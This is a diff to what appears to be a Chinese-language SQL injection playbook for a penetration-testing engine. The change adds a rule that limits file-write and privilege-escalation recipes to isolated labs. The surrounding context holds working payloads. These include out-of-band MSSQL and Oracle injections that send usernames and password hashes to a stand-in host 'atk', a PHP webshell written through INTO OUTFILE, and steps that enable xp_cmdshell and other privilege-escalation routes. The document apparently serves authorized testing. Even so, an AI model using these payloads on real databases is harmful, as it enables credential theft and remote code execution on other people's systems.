@@ -82,7 +82,11 @@ sqlmap -m evidence/sqli-endpoints.txt --batch --level 2 --risk 1 --threads=1 --d
 ### OOB 全载荷（MSSQL/Oracle）
 MSSQL OpenRowSet 走 80/443 绕出网限制并带数据：`'; INSERT INTO OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=atk,80;UID=sa;PWD=p','SELECT * FROM foo') SELECT TOP 1 username+':'+password FROM users--`。Oracle：`'+UTL_HTTP.REQUEST('http://atk/'||(SELECT username FROM all_users WHERE ROWNUM=1))--`；DNS 带数据 `'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.atk.com')--`；`DBMS_LDAP.INIT(...,389)`。
 
-### INTO OUTFILE 与提权四路
+### v5.6.0 执行档边界统一（审计修复：主体纪律与扩展内容分层）
+
+本手册**前半部**（基线对照/布尔/时间/堆叠探针/盲注裁决）= 检测与确证手法，production_safe 可执行（受审批矩阵约束）；**后半部的 INTO OUTFILE/webshell 写入/UDF/xp_cmdshell 提权配方** = 实验室利用手法，**仅 isolated_lab 执行**（production_safe 下引擎逐动作强制拦截，引用时仅作为"影响上限说明"写进报告，不投递）。存在性证明口径：布尔/时间/UNION 读三通道任一确证即止——数据外带(读敏感表)按 ROE 数据最小化纪律限额，**写文件/提权在生产目标一律不做**（生产档 RCE 类动作转 S5 审批且通常仅做"影响说明"）。
+
+### INTO OUTFILE 与提权四路（isolated_lab 限定）
 `SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/x.php'` 前提=FILE 权限+web 根可写+`@@global.secure_file_priv=''`（先探）。提权：MSSQL `sp_configure 'show advanced options',1;RECONFIGURE;sp_configure 'xp_cmdshell',1;RECONFIGURE`；COM 自动化 `sp_OACreate 'wscript.shell'`；MySQL UDF `CREATE FUNCTION...SONAME`；Oracle `dbms_java.grant_permission`。
 
 ### 预编译盲区补两场景与 WAF 手工变体
